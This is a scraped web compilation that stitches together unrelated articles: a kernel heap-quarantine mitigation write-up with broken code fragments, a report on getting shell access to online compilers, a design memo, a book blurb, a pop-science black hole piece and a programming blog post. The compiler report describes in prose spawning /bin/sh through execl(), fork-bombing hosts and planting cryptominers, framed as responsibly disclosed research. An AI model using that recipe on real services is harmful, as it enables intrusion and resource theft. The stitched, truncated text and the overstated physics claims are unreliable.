<p>While both package managers have the basic functionality you’d expect from a package manager, MacPorts is generally much more full featured than Homebrew is. Part of this is probably a result of architectural disparities, one example of which being that Homebrew’s set of commands to manage the dependency tree is somewhat limited. While this is unfortunate, having these limitations is somewhat reasonable given the underlying design, which would make implementing these features difficult.</p>

<p>Less justifiable is Homebrew’s habit of missing useful but slightly less-commonly used functionality (some of which have been mentioned above), and in extreme cases <em>removing</em> features entirely, or crippling them so that they are significantly less usable. Into this dubious category goes useful functionality like the ability to find and …</p></section></article></div></div>

    <p>It's 2020. Quarantines are everywhere – and here I'm writing about one, too.
But this quarantine is of a different kind.</p>

<p>In this article I'll describe the <strong>Linux Kernel Heap Quarantine</strong> that I developed
for mitigating kernel use-after-free exploitation. I will also summarize
the discussion about the prototype of this security feature on the Linux Kernel
Mailing List (LKML).</p>



<p>Use-after-free (UAF) vulnerabilities in the Linux kernel are very popular for
exploitation. There are many exploit examples, some of them include:</p>
<ul>
  <li><a href="https://seclists.org/oss-sec/2016/q4/607">CVE-2016-8655</a></li>
  <li><a href="https://www.openwall.com/lists/oss-security/2017/02/26/2">CVE-2017-6074</a></li>
  <li><a href="https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html">CVE-2017-2636</a></li>
  <li><a href="https://ssd-disclosure.com/ssd-advisory-linux-kernel-af_packet-use-after-free/">CVE-2017-15649</a></li>
  <li><a href="https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html">CVE-2019-18683</a></li>
</ul>

<p>UAF exploits usually involve <strong>heap spraying</strong>.
Generally speaking, this technique aims to put attacker-controlled bytes at a defined memory
location on the heap. Heap spraying for exploiting UAF in the
Linux kernel relies on the fact that when <code>kmalloc()</code> is called, the slab
allocator returns the address of memory that was recently freed:</p>

<p>So allocating a kernel object with the same size and attacker-controlled
contents allows overwriting the vulnerable freed object:</p>

<center><a href="https://a13xp0p0v.github.io/img/uaf.png"><img src="https://a13xp0p0v.github.io/img/uaf.png" width="70%"></a></center>


<p>Note: Heap spraying for out-of-bounds exploitation is a separate technique.</p>



<p>In July 2020, I got an idea of how to break this heap spraying technique for UAF
exploitation. In August I found some time to try it out. I extracted the slab
freelist quarantine from <a href="https://www.kernel.org/doc/html/latest/dev-tools/kasan.html">KASAN</a> functionality and called it <code>SLAB_QUARANTINE</code>.</p>

<p>If this feature is enabled, freed allocations are stored in the quarantine
queue, where they wait to be actually freed. So there should be no way for them
to be instantly reallocated and overwritten by UAF exploits.
In other words, with <code>SLAB_QUARANTINE</code>, the kernel allocator behaves like so:</p>

<p>On August 13, <a href="https://www.openwall.com/lists/kernel-hardening/2020/08/13/7">I sent</a> the first early PoC to LKML and started deeper research of
its security properties.</p>



<p>For researching the security properties of the kernel heap quarantine, I developed
two <code>lkdtm</code> tests (<a href="https://www.openwall.com/lists/kernel-hardening/2020/09/29/7">code is available here</a>).</p>

<p>The first test is called <code>lkdtm_HEAP_SPRAY</code>. It allocates and frees an object
from a separate <code>kmem_cache</code> and then allocates 400,000 similar objects.
In other words, this test attempts an original heap spraying technique for UAF
exploitation:</p>

        <span>...</span>
        <span>if</span> <span>(</span><span>spray_addrs</span><span>[</span><span>i</span><span>]</span> <span>==</span> <span>addr</span><span>)</span> <span>{</span>
            <span>pr_info</span><span>(</span><span>"FAIL: attempt %lu: freed object is reallocated</span><span>\n</span><span>"</span><span>,</span> <span>i</span><span>);</span>
            <span>break</span><span>;</span>
        <span>}</span>
    <span>}</span>
    
    <span>if</span> <span>(</span><span>i</span> <span>==</span> <span>SPRAY_LENGTH</span><span>)</span>
        <span>pr_info</span><span>(</span><span>"OK: original heap spraying hasn't succeeded</span><span>\n</span><span>"</span><span>);</span>
</code></pre></div></div>

<p>If <code>CONFIG_SLAB_QUARANTINE</code> is disabled, the freed object is instantly
reallocated and overwritten:</p>

<div><div><pre><code>  # echo HEAP_SPRAY &gt; /sys/kernel/debug/provoke-crash/DIRECT
   lkdtm: Performing direct entry HEAP_SPRAY
   lkdtm: Allocated and freed spray_cache object 000000002b5b3ad4 of size 333
   lkdtm: Original heap spraying: allocate 400000 objects of size 333...
   lkdtm: FAIL: attempt 0: freed object is reallocated
</code></pre></div></div>

<p>If <code>CONFIG_SLAB_QUARANTINE</code> is enabled, 400,000 new allocations don't overwrite
the freed object:</p>

<div><div><pre><code>  # echo HEAP_SPRAY &gt; /sys/kernel/debug/provoke-crash/DIRECT
   lkdtm: Performing direct entry HEAP_SPRAY
   lkdtm: Allocated and freed spray_cache object 000000009909e777 of size 333
   lkdtm: Original heap spraying: allocate 400000 objects of size 333...
   lkdtm: OK: original heap spraying hasn't succeeded
</code></pre></div></div>

<p>That happens because pushing an object through the quarantine requires <strong>both
allocating and freeing memory</strong>. Objects are released from the quarantine as
new memory is allocated, but only when the quarantine size is over the limit.
And the quarantine size grows when more memory is freed up.</p>

<p>That's why I created the second test, called <code>lkdtm_PUSH_THROUGH_QUARANTINE</code>.
It allocates and frees an object from a separate <code>kmem_cache</code> and then performs
<code>kmem_cache_alloc()+kmem_cache_free()</code> for that cache 400,000 times.</p>

<div><div><pre><code>    <span>addr</span> <span>=</span> <span>kmem_cache_alloc</span><span>(</span><span>spray_cache</span><span>,</span> <span>GFP_KERNEL</span><span>);</span>

        <span>if</span> <span>(</span><span>push_addr</span> <span>==</span> <span>addr</span><span>)</span> <span>{</span>
            <span>pr_info</span><span>(</span><span>"Target object is reallocated at attempt %lu</span><span>\n</span><span>"</span><span>,</span> <span>i</span><span>);</span>

    <span>}</span>
</code></pre></div></div>

<p>This test effectively pushes the object through the heap quarantine and
reallocates it after it returns back to the allocator freelist:</p>

</code></pre></div></div>

<p>As you can see, the number of the allocations needed for overwriting
the vulnerable object is almost the same. That would be good for stable
UAF exploitation and should not be allowed.
That's why I developed <a href="https://www.openwall.com/lists/kernel-hardening/2020/09/29/6"><strong>quarantine randomization</strong></a>. This randomization
required very small hackish changes to the heap quarantine mechanism.</p>

<p>The heap quarantine stores objects in batches. On startup, all
quarantine batches are filled by objects. When the quarantine shrinks,
I randomly choose and free half of objects from a randomly chosen batch.
The randomized quarantine then releases the freed object at an unpredictable moment:</p>

<div><div><pre><code>   lkdtm: Target object is reallocated at attempt 107884
   lkdtm: Target object is reallocated at attempt 265641
   lkdtm: Target object is reallocated at attempt 100030
   lkdtm: Target object is NOT reallocated in 400000 attempts
   lkdtm: Target object is reallocated at attempt 204731
   lkdtm: Target object is reallocated at attempt 359333
   lkdtm: Target object is reallocated at attempt 289349
   lkdtm: Target object is reallocated at attempt 119893
   lkdtm: Target object is reallocated at attempt 225202
   lkdtm: Target object is reallocated at attempt 87343
</code></pre></div></div>

<p>However, this randomization alone would not stop the attacker:
the quarantine stores the attacker's data (the payload) in the sprayed objects!
This means the reallocated and overwritten vulnerable object contains the payload
until the next reallocation (very bad!).</p>

<p>This makes it important to <strong>erase heap objects before placing them in the heap quarantine</strong>.
Moreover, filling them with zeros gives a chance to detect UAF
accesses to non-zero data for as long as an object stays in the quarantine (nice!).
That functionality already exists in the kernel, it's called <code>init_on_free</code>.
<a href="https://www.openwall.com/lists/kernel-hardening/2020/09/29/5">I integrated it</a> with <code>CONFIG_SLAB_QUARANTINE</code> as well.</p>

<p>During that work I found a bug: in <code>CONFIG_SLAB</code>, <code>init_on_free</code> happens too
late. Heap objects go to the KASAN quarantine while still "dirty." I provided the fix
in a <a href="https://www.openwall.com/lists/kernel-hardening/2020/09/29/4">separate patch</a>.</p>

<p>For a deeper understanding of the heap quarantine's inner workings, I provided an <a href="https://www.openwall.com/lists/kernel-hardening/2020/09/29/8">additional
patch</a>, which contains verbose debugging (not for merge).
It's very helpful, see the output example:</p>

<div><div><pre><code>   quarantine: PUT 508992 to tail batch 123, whole sz 65118872, batch sz 508854
   quarantine: whole sz exceed max by 494552, REDUCE head batch 0 by 415392, leave 396304
   quarantine: data level in batches:
     0 - 77%
     1 - 108%
     2 - 83%
     3 - 21%
   ...
     125 - 75%
     126 - 12%
     127 - 108%
   quarantine: whole sz exceed max by 79160, REDUCE head batch 12 by 14160, leave 17608
   quarantine: whole sz exceed max by 65000, REDUCE head batch 75 by 218328, leave 195232
   quarantine: PUT 508992 to tail batch 124, whole sz 64979984, batch sz 508854
   ...
</code></pre></div></div>

<p>The heap quarantine <code>PUT</code> operation you see in this output happens during kernel memory freeing.
The heap quarantine <code>REDUCE</code> operation happens during kernel memory allocation, if the quarantine
size limit is exceeded. The kernel objects released from the heap quarantine return to the allocator
freelist – they are actually freed.
In this output, you can also see that on <code>REDUCE</code>, the quarantine releases some part of
a randomly chosen object batch (see the <a href="https://www.openwall.com/lists/kernel-hardening/2020/09/29/6">randomization patch</a> for more details).</p>



<p>I made <a href="https://www.openwall.com/lists/kernel-hardening/2020/10/01/7">brief performance tests</a> of the quarantine PoC on real hardware and in virtual machines:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://serhack.me/images/compilers/1.png" alt="Compilers security report"></p><p>Online compilers are a handy tool to save time and resources for coders, and are freely available for a variety of programming languages. They are useful for learning a new language and developing simple programs, such as the ubiquitous <a href="https://en.wikipedia.org/wiki/%22Hello,_World!%22_program">“Hello World”</a> exercise. I often use online compilers when I am out, so that I don’t have to worry about locating and downloading all of the resources myself.</p><p>Since these online tools are essentially remote compilers with a web interface, I realized that I might be able to take remote control of the machines through command injection. My research identified a common weakness in many compilers: inadequate sanitization of user-submitted code prior to execution. My analysis revealed that this lack of input filtration enables exploits that an hacker can use to take control of the machine or deliberately cause it to crash.</p><p>A clever attacker can exploit built-in C functions and POSIX libraries to gain control over the computer hosting the online compiler. Commands like <a href="https://linux.die.net/man/3/execl">execl()</a>, <a href="https://linux.die.net/man/3/system">system()</a>, and <a href="https://linux.die.net/man/3/getenv">GetEnv()</a> can be used to probe the target machine operating system and run any command on its built-in shell.</p><p>I wanted to write this article to remind how sandboxed environment are important when shipping an application such as this!</p><h2 id="vulnerability-description">Vulnerability description</h2><p>In this section, I will introduce the reader to the vulnerability explaining both theory and practice processes.</p><h3 id="gaining-access">Gaining access</h3><p>In several of the C/C++ compilers that I analyzed, the GetEnv(), system(), functions allow an attacker to study and execute any command on the remote machine. The GetEnv() function allows a hacker to learn information about the machine that is otherwise concealed from the web interface, such as the username and OS version.</p><p>Once this information is revealed, the attacker can begin testing various exploits to achieve privilege escalation and gain access to a root shell. For example, the system() command can be used to execute malicious code and access sensitive data such as logs, website files, etc.</p><p>Since the exploit I discovered involves inserting hostile commands to gain control of an unwitting machine, this attack vector is classified as a <a href="https://en.wikipedia.org/wiki/Code_injection">code injection</a> vulnerability.</p><h3 id="maintaining-control">Maintaining control</h3><p>If hacker tries to run the online compiler every time they want to send a new command, the attack would leave an obvious trace, and the resource use might draw attention to the suspicious activity. These obstacles can be conveniently sidestepped by using the execl() function, which allows the user to specify any arbitrary program to replace the current process. An attacker can gain access to the machine’s built-in shell by invoking the execl() function to replace the current process with <code>/bin/sh</code>, with catastrophic implications.</p><p>Many compilers allow input from the browser, in which case the hacker can craft a program to relay input commands to the shell of the compromised machine. Once the hacker uses <code>execl()</code> to open a shell via browser, they can simply operate the remote machine using <code>system()</code> to inject various instructions. This avoids the need to run the compiler each time the attacker wishes to explore or exploit the compromised machine.</p><h3 id="implications">Implications</h3><p>A hacker that obtains shell access in this way gains access to files and services typically protected from outside users. The attacker now has many options at their disposal for exploiting the machine and/or wreaking havoc; how they proceed will depend on their tools and motives.</p><p>If the attacker wishes to crash the target machine, they can achieve this by (mis)using the fork() function, which creates <a href="https://serhack.me/articles/introduction-to-monerov-and-its-inherent-risks/"><del>a new cryptocurrency</del></a> clone of the current process. A fork() function placed within a while (true) loop will execute indefinitely, repeatedly cloning the process to greedily consumed precious RAM memory. This rapid uncontrolled use of resources will overwhelm the machine, causing a self-DOS (denial of service attack).</p><p>Instead of maliciously crashing a machine, an attacker may wish to monetize their illicit access. This can be accomplished by injecting a cryptocurrency miner, which will generate funds for the attacker at the expense of the victim’s computational resources and electric bill. My analysis showed that this maneuver allows useful exploitation of online compilers that successfully stymied other attacks by sandboxing the environment or adopting more advanced techniques to limit file access.</p><h3 id="theory">Theory</h3><p>This section documents the commands used to gain and maintain access to the online compiler.

Access to protected files and services can be prevented by creating a secure sandbox for the application.

In order to avoid these “mining” attacks, the sandbox should have limited resources and it should be able to reboot itself every 10 minutes.</p><p>To eliminate the underlying weakness, the libraries could be recompiled without the particular exploitable functions. An attacker cannot gain a foothold if the execl() and system() are removed or disabled by recompiling libraries.</p><p>In addition to this, tools such as <a href="https://docker.com/">Docker</a> might be used to create a sandboxed environment. A sandbox is a mechanism to run applications in a limited space. It usually provides a restricted and controlled set of resources to the program that needs to be tested, such as a restricted area of memory or a set of limited system calls; normally, network access, the ability to inspect the host system or read from input devices, are disabled or highly restricted.</p><p>At the time of my search, I found at least two compilers with a non-sandboxed environment. I contacted the managers and they resolved in less than a week. For others I verified that they were actually under a sandboxed environment. Injected scripts were immediately identified and the “malicious” user was banned.</p><p>Do you have any suggestions for my articles?

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
      
<p>An infinite canvas sounds appealing, but there's a reason the page model is so widely used in productivity tools. Read on to learn why, and how you can help test an infinite canvas for Muse.</p>

<p>When using Muse in portrait mode, you might wonder: what’s the deal with that black bar?</p>

<img src="https://museapp.com/memos/2020-12-infinite-canvas/muse-bars.png" alt="Muse with black bar in portrait mode">

<p>The dead space is because Muse currently uses a page-based visual model. Boards are created in landscape orientation by default. The black bar you see here is the same as viewing a landscape-orientation photo on your iPad in portrait orientation, which places black bars above and below.</p>

<img src="https://museapp.com/memos/2020-12-infinite-canvas/photos-bars.jpg" alt="Photos app with black bars in portait mode">

<p>This puts Muse in good company: most productivity apps including presentation software like Keynote or <a href="https://pitch.com/">Pitch</a>, word processors like Google Docs, and digital sketchbooks like <a href="https://paper.bywetransfer.com/">Paper</a> use a page model.</p>

<figure>
  <img src="https://museapp.com/memos/2020-12-infinite-canvas/goodnotes-pages.png" alt="GoodNotes screenshot">
  <figcaption><p>The beautifully-designed digital sketchbook <a href="https://www.goodnotes.com/">GoodNotes</a> uses a page-based model.</p></figcaption>
</figure>

<p>The ancestry of these apps trace back to paper-based counterparts. So perhaps this is just an artifact of the analog medium, needlessly carried forward into digital?</p>

<p>But there’s more to it than that: the page model provides structure, a sense of scale, and a way for the user to orient themselves. As a thought experiment, imagine a slide deck creator where every slide started in the center and was of potentially infinite size. A concept like “I’ll put this on the side, since it’s less important” becomes meaningless when there are no sides.</p>

<h2>Infinite canvas in design tools</h2>

<p>That brings us to the “infinite canvas” lineage of design tools: Illustrator, Sketch, Figma. Designers love the ability to arrange artboards spatially to show user flows or sets of design variations. But to date there are few examples of successful infinite canvas apps outside the realm of design.</p>

<figure>
  <img src="https://museapp.com/memos/2020-12-infinite-canvas/figma-canvas.png" alt="Figma screenshot">
  <figcaption>
    <p>Figma is the archetype for design tools with an infinite canvas.</p>
  </figcaption>
</figure>

<p>So why not “just” remove the boundaries, and create boards with no edges?</p>

<p>The ability to <a href="https://museapp.com/handbook#to-expand-a-board">expand boards</a> on one axis is how Muse works today. It’s still a page: just one you can make wider, like a spool of paper. But our experiments have shown that this starts to break down as you add more directions of freedom. The user quickly finds themselves disoriented, like floating in an endless white void. (Maybe you can find <a href="https://www.change.org/p/apple-free-jony-ive-from-his-white-room">Jony Ive's white room</a> out there somewhere!)</p>

<p>One solution is adding arbitrary zooming, like Figma: pull out to see the landscape, pull back in to do detail work. But this adds another layer of confusion because there is no consistent sense of scale. For example, if you can start drawing at an arbitrary zoom level, what happens with your ink thickness? And that's without working through the interface and mental-model collision of Muse's nested boards and spatial navigation.</p>

<p>So that's the tradeoff: the page model great for getting the user oriented and having a sense of scale and structure. Yet with Muse we’ve seen that the page model is irritating not just for those black bars in portrait mode, but also when you get to the edge of the board and just need a tad more space.</p>

<h2>Designing a solution</h2>

<p>The Muse team has spent the last few weeks on intensive design prototyping to explore whether we can find a better tradeoff. Is there a sweet spot that gets the best parts of an infinite canvas (feeling of spatiousness and unconstrained creation) with the best parts of the page model (feeling of groundedness and orientation)?</p>

<figure>
  <img src="https://museapp.com/memos/2020-12-infinite-canvas/prototype-origami.png" alt="Origami Studio screenshot">
  <img src="https://museapp.com/memos/2020-12-infinite-canvas/prototype-html.png" alt="HTML prototype">

  </figcaption>
</figure>

<p>Some choices we made based on these explorations:</p>

<ul>
<li><strong>Boards are anchored in the upper-left.</strong> We found having two clear “edges” of the board is a nice way to orient, since there’s a clear starting place and then two possible directions to grow (right or down).</li>
<li>Rather than explicitly adding board space, you move content (a card or ink) into empty space. The <strong>board is always the size of its content</strong>. However we also have some prototypes with more explicit edges and make-space gestures; we'll continue to play with this.</li>
<li>We avoid some of the “lost in a white void” problem by <strong>preventing scrolling to completely empty space</strong>. You can't scroll over five screens worth and then drop a single dot of ink.</li>
<li>Scroll bars don’t make as much sense in this setup; we’re <strong>experimenting with <a href="https://gamedevelopment.tutsplus.com/tutorials/positioning-on-screen-indicators-to-point-to-off-screen-targets--gamedev-6644">offscreen content indicators</a>, inspired by open-world video games</strong>.</li>
</ul>

<p>And here's an early look at this implemented in Muse:</p>

<video preload="metadata" muted="" loop="" playsinline="" autoplay="">
  <source src="https://media.museapp.com/website/2020-11-30-infinite-canvas.mp4#t=0.01">
</video>

<h2>Open questions</h2>

<p>This is still early. One thing we’ve seen in testing already is that having more space on a board makes the user less inclined to create sub-boards. This is good for creation (less effort) but not as good for reading (nested exploration is more approachable than a huge two-dimensional board).</p>

<p>There are also big new technical challenges with these boards. In the released product, we may end up limiting the board size to manage this. So less “infinite” and more “open, two-axis expansion”—though that doesn’t quite have the same ring.</p>

<h2>Join the beta</h2>

<p>This is still a work-in-progress, but it’s far enough along that we’d like to get customer input. Is this an improvement over the current page-based model? That’s something only real-world use will tell.</p>

     <p id="u7235-5">The Future of Text Book : A 2020 Vision</p>
     
     
     <p id="u7235-16">Growing out of the annual <a href="https://www.thefutureoftext.org/symposium.html" data-href="page:U74">Symposium</a><span id="u7235-11">, </span>we have put together a book published by <a href="https://futuretextpublishing.com/">Future Text Publishing</a> on the possible futures of text which has turned out to be the largest survey of the future of text ever undertaken, with a wide range of different perspectives and inspirations.</p>
     
     <p id="u7235-22">The book is intended to be a collection of dreams for how we want text to evolve as well as how we understand our current textual infrastructures, how we view the history of writing and much more. The aim is to make it inspire a powerfully rich future of text in a multitude of ways today and to still have value in a thousand years and beyond<a href="https://www.thefutureoftext.org/2020-vision-book.html#publishing" data-href="anchor:U7223:U7531">*</a>. It should serve as a record for how we saw the medium of text and how it relates to our world, our problems and each other in the early twenty first century.</p>

     <p id="u7235-45">“The thing that amazed me - even humbled me - about the digital computer when I first encountered it over fifty years ago - was that, in the computer, I saw that we have a tool that does not just move earth or bend steel, but we have a tool that actually can manipulate symbols and, even more importantly, portray symbols in new ways, so that we can interact with them and learn. We have a tool that radically extends our capabilities in the very area that makes us most human, and most powerful.”</p>
     
     <p id="u7235-48">“There is a native American myth about the coyote, a native dog of the American prairies - how the coyote incurred the wrath of the gods by bringing fire down from heaven for the use of mankind, making man more powerful than the gods ever intended. My sense is that computer science has brought us a gift of even greater power, the ability to amplify and extend our ability to manipulate symbols…”</p>
     
     <p id="u7235-56">“We need to become better at being humans. <span id="u7235-51">Learning to use symbols and knowledge in new ways, across groups, across cultures, is a powerful, valuable, and very human goal. </span>And it is also one that is obtainable, if we only begin to open our minds to full, complete use of computers to augment our most human of capabilities.”<br><a href="http://dougengelbart.org/content/view/348/000/"><span id="u7235-54">Douglas C.

						<p>For the longest time, scientists firmly believed that once something fell into a black hole, it would be quite literally impossible for it to get back out. Now, for the first time, new research shows that this may not be the case entirely.</p>

<p>To understand this arguably groundbreaking news about black holes, you must first understand what is known as the “black hole information paradox.” This paradox stems from calculations suggesting that any physical information that falls into a black hole permanently disappears, which in itself violates a core concept of modern physics. This is that the value of a wave function at one point in time should also determine its value at any other time. Simply put, information cannot be destroyed.</p>
<p>Some physicists who study black holes have even gone as far as to say that the simple fact that black holes exist shows that there are other layers to reality itself. This type of thinking is formed from the fact that black holes behave in ways that don’t make sense with traditional physics. The very nature of space-time itself begins to break down as you look deeper and deeper into black holes.</p>
<p>Scientists now believe that black holes of great age no longer retain every bit of physical information that falls into them. In fact, they believe that the mechanism that prevented all of that information from escaping is actually reversed.</p>

<p>As Quanta put it, “If you jump into one, you will not be gone for good. Particle by particle, the information needed to reconstitute your body will reemerge.” This has been a popular theory among string theory believers for some time, but this is the first time there has been some evidence to support it.</p>
<p>Information would be able to slowly seep its way out of the grasp of a black hole through gravity itself. However, the math only checks out with a bit of quantum physics sprinkled in as well. This thinking adds a new aspect to black holes — a quantum halo.</p>
<p>A quantum halo effect added to black holes would allow them to interact with their surroundings via small fluctuations in space-time, ultimately allowing information to escape exceptionally slowly. So slowly, in fact, that if you fell into a black hole, by the time all of your information finally escaped, nothing would be alive in the entire universe.</p>
<p>While this is great progress in the quest to solve the black hole information paradox, it is far from a complete solution. In order for this new theory to check out, changes need to be made to the notion of locality, a monumental task.</p>

December 2, 2020 | https://adventures.michaelfbryan.com/posts/turning-feature-requests-into-code/ | <a href="https://web.archive.org/web/*/https://adventures.michaelfbryan.com/posts/turning-feature-requests-into-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As part of my previous job I worked on a CAD/CAM package, and a very common
task would be to take a vague feature description, rephrase it as a more
formal software problem, then use computational geometry algorithms to turn
it into code which can be integrated into the overall application.</p><p>I eventually got quite good at this, so I’m going to write down the system I
came up with. This process works especially well for larger features which
add new functionality with minimal coupling to existing code.</p><p>If you found this useful or spotted a bug, let me know on the blog’s
<a href="https://github.com/Michael-F-Bryan/adventures.michaelfbryan.com">issue tracker</a>!</p><h2 id="step-1-research">Step 1: Research</h2><p>While you <em>can</em> dive into the code immediately, a lot of the time creating your
own solution from scratch will lead to an implementation with logic/design
flaws.</p><p>This is especially the case when you are working on things requiring complex
algorithms or mathematical concepts.</p><h3 id="understanding-the-problem">Understanding the Problem</h3><p>Often the problem you are given won’t be something straightforward like
<em>“implement A* path finding”</em>. Feature descriptions normally come from a
non-programmer and will be something a lot less precise, like</p><blockquote><p>I want to display a CAD drawing in the background, then when I click points
on the drawing you should create a path which goes from A to B to C taking the
shortest path along that drawing without doubling back on itself.</p></blockquote><p>Often important bits will be left out, too.</p><blockquote><p>Oh, and this background drawing may have points added or removed at any time.</p></blockquote><p>(i.e. we need to deal with mutation)</p><p>Unfortunately, that’s a bit too vague to turn into code and Googling a
problem statement like that won’t be very helpful! What we want is a
description of the problem which can be phrased as computer operations.</p><p>When I’m given a vague feature description the first thing I’ll do is draw it
out. Seeing something visualised is often enough to summon the correct keywords
to rephrase the problem in a more searchable form.</p><p>I don’t know about you, but when I see something like this, my first thought is
that we’re doing pathfinding. We’re also trying to optimise for the shortest
distance while preferring untraversed edges.</p><figure><img src="https://adventures.michaelfbryan.com/img/link-lines.gif" alt="Animation of the expected interaction" width="75%"><figcaption><p>Problem visualised (black lines are the background image, red X means click, red lines are the desired path)</p></figcaption></figure><p>Don’t forget to come up with an unambiguous definition of <em>“done”</em>. This lets
you determine when the feature request has been fulfilled, and gives you a way
to ward off <a href="https://www.wrike.com/project-management-guide/faq/what-is-scope-creep-in-project-management/">scope creep</a>.</p><div><p>This example came was one of the feature requests which taught me the
importance of getting the full picture up front and leaving yourself room to
make changes down the track.</p><p>In this case, I’d created a component for doing pathfinding by converting the
“background drawing” into a graph and passing it to <em>A*</em>, but neglected to
ask whether the background drawing would change.</p><p>Only after I’d finished integrating the component into the overall CAD/CAM
package did I find out that we need a way to add a path midway along an edge
of the background drawing (mutating the graph by removing an edge and
replacing it with two smaller edges). I’m a big fan of immutability, so you
can see how this might be a problem.</p><p>We ended up needing to rewrite the component because immutability was so
deeply ingrained into its implementation… I’d engineered myself into a
corner!</p></div><p>If your problem involves a lot of maths (like a lot of my computational
geometry work) it’s a good idea to draw sketches and try to work out the
solution by hand. This also lets you derive equations that you’ll need later
on.</p><h2 id="searching-for-prior-art">Searching for Prior Art</h2><p>Once you can phrase the problem in computer terms it’s time to pull out the
programmer’s most powerful tool… The internet.</p><p>You’re looking anything relevant to the problem at hand. This may take the form
of:</p><ul><li>Wikipedia - usually my first port of call</li><li>Blog posts exploring similar problems</li><li>Academic Papers - tend to be quite information-dense and go into <em>much</em> more
detail than you care about, but a quick skim through will often find pictures
or algorithms that are useful</li><li>Existing Products or Libraries - why waste weeks reimplementing the wheel?</li></ul><p>I’ll often end up with 20-40 open tabs with promising items from the first
couple pages of search results, then I’ll skim through the content on each
tab, also checking out interesting things <em>those</em> pages link to.</p><p>Continuing with our example from before where we’re wanting to find the path
from one point to another preferring to use unvisited edges, I might search
for things like:</p><ul><li>Pathfinding</li><li>Pathfinding preferred</li><li>Pathfinding algorithm</li><li>Incremental pathfinding (because it’ll happen over multiple user interactions)</li><li>Undirected weighted graph traversal</li></ul><p>My definition of “interesting” is anything which seems to mention keywords from
my problem. Algorithm names are particularly useful.</p><p>This <a href="https://www.redblobgames.com/pathfinding/a-star/introduction.html"><em>Introduction to the A* Algorithm</em></a> link ticks a lot
of those boxes. Plus it seems to be a tutorial with lots of code snippets and
pictures, which will be handy when it gets to the implementation.</p><p><img src="https://adventures.michaelfbryan.com/img/pathfinding-search-results.png" alt="Search result showing “Introduction to the A\* Algorithm” with certain words highlighted"></p><h2 id="step-2-thinking-about-the-public-api">Step 2: Thinking About the Public API</h2><p>No code exists in a vacuum, so knowing how the outside world will use your
feature has a big effect on how it will be integrated into the rest of the
application.</p><p>In this stage you develop a big picture view of the feature and how it will
expose its functionality to the outside world.</p><p>The feature’s public API also acts as a natural seam that you can use for
testing (e.g. mocking out the component when testing the application) and to
allow you to restructure the feature’s implementation (or swap it out
entirely) without breaking the rest of the application.</p><p>Every feature will be used differently so it’s hard to provide concrete
examples, but here some questions to ask yourself:</p><ul><li>Is this a well-contained batch process or is the feature interactive?</li><li>What are my inputs and outputs?</li><li>Are there any hard constraints imposed by the implementation?</li><li>If the process will take a long time (i.e. more than 100ms), does it need to
report progress or support cancellation?</li><li>Do I need to let the caller update the feature’s internal state? (e.g. when
altering the “background drawing” from the earlier example)</li><li>How are we going to report failure?</li><li>Is there information the caller will need to provide? (see <a href="https://www.freecodecamp.org/news/a-quick-intro-to-dependency-injection-what-it-is-and-when-to-use-it-7578c84fa88f/"><em>Dependency
Injection</em></a> and the <a href="https://refactoring.guru/design-patterns/strategy">Strategy Pattern</a>)</li><li>Is this a thin interface, or will I need to leak a lot of implementation
details to the caller? (see <a href="https://www.joelonsoftware.com/2002/11/11/the-law-of-leaky-abstractions/"><em>The Law of Leaky Abstractions</em></a>)</li><li>Would I reasonably want to reuse this component elsewhere?</li><li>Does my language promote patterns or abstractions that would make the code
more ergonomic to use if written in a certain way? (C# has events as
first-class citizens, Go’s goroutines and channels are great for creating
streams of events, etc.)</li><li>Does the larger application provide natural mechanisms or extension points
that we can use?</li></ul><p>Answering these questions should give you an idea of how your feature will
interact with the rest of the application, and from there you can start
thinking in more concrete terms like interfaces and data types.</p><div><p>You actually don’t need to write code for this step.</p><p>My normal approach was to turn away from my computer and stare at a random
patch of wall on the other side of the office. This lets me think about how I
want to interact with the feature without being bogged down with the precise
details you get when writing code.</p></div><p>If your research indicated the feature’s implementation will be quite
complex, there are a couple tools at your disposal for limiting how much of
that complexity leaks into the wider application. Namely, by encapsulating
the problem you can paper over the complexity (see the <a href="https://refactoring.guru/design-patterns/facade"><em>Facade
Pattern</em></a>) or adding another level of <a href="https://wiki.c2.com/?OneMoreLevelOfIndirection"><em>Indirection</em></a>
(e.g. introduce a middle-man).</p><p>Try to avoid creating a “chatty” API, if possible. Making the caller go back
and forth into your code to do complex operations leads to increased coupling
and more bugs down the track.</p><h2 id="step-3-initial-implementation">Step 3: Initial Implementation</h2><p>Now you’ve done some background research and thought about the feature’s API,
it’s time to actually start implementing it. Depending on how your research
went, this stage can be either very easy or very hard.</p><h3 id="the-easy-case">The Easy Case</h3><p>If you are lucky, you may have stumbled upon a similar solution during your
research that you can reuse or adapt to fit your purposes. This was the case
with our from earlier, by analysing the feature request we were able to
reduce it to a pathfinding issue; a solved problem in computer science.</p><p>It’s really nice when this happens. Often implementation is just a case of
going to the Wikipedia page, scrolling down to <a href="https://en.wikipedia.org/wiki/A*_search_algorithm#Pseudocode">the pseudocode section</a>,
and adapting it fit the API you developed earlier.</p><p>Just remember to sprinkle in enough tests to make sure the implementation is
correct and edge cases are handled gracefully.</p><p>There’s not much more to be said here.</p><h3 id="the-not-so-easy-case">The Not-So-Easy Case</h3><p>Unfortunately, most “interesting” feature requests won’t have libraries or
tutorials you can use directly, requiring you to do a bit of original work.</p><p>A lot of the work I do has a visual or mathematical element to it, so you can
simulate the feature using pen and paper.</p><p>I’ll often start with the top-most level first, stubbing out the public API
with code that just blows up (i.e. <code>throw new NotImplementedException()</code> in C#
or <code>todo!()</code> in Rust).</p><p>From there you can start decomposing each of the functions into
sub-functions, recursively decomposing the problem into smaller problems
until you eventually reach a problem you know the solution to.</p><p>Whenever you get stuck, look back over the resources you found while
researching. You may have missed some gem of knowledge which will make
everything <em>click</em>.</p><p>An alternative to this top-down approach is attacking the problem bottom-up.
You’ll often take this approach when you know how something deep down is done,
but aren’t quite sure how to connect that with the public API.</p><p>When taking the bottom-up approach I’ll first implement the thing I know and
make sure to develop a solid foundation. Then you add higher and higher level
layers, slowly working your way towards that public API you want to expose.</p><p>In practice you’ll often use a hybrid approach, …</p></div></div>

